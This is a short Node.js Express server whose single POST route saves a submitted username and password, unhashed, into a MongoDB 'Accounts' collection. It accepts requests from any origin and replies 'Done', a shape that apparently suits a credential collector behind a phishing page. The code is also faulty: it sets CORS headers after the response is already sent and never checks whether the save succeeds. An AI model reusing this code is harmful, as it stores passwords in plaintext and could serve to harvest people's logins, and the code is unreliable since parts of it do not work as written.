const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");
dotenv.config();

const UserModel = require("./models/Accounts");

// configure the connections
const app = express();
app.use(express.json());
app.use(cors({ origin: `*` }));

mongoose
  .connect(process.env.MONGO_URL)
  .then(() => console.log("Connected to MongoDB"));

app.post("/", (req, res) => {
  const { user, pass } = req.body;

  // send the data to the database
  const userr = new UserModel({ user, pass });
  userr.save();
  res.send("Done");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Max-Age", "1800");
  res.setHeader("Access-Control-Allow-Headers", "content-type");
  res.setHeader(
    "Access-Control-Allow-Methods",
    "PUT, POST, GET, DELETE, PATCH, OPTIONS"
  );
  // res.setHeader("Content-Type", "application/json;charset=utf-8"); // Opening this comment will cause problems
});

app.listen(process.env.PORT, () => {
  console.log("Server is Running");
});
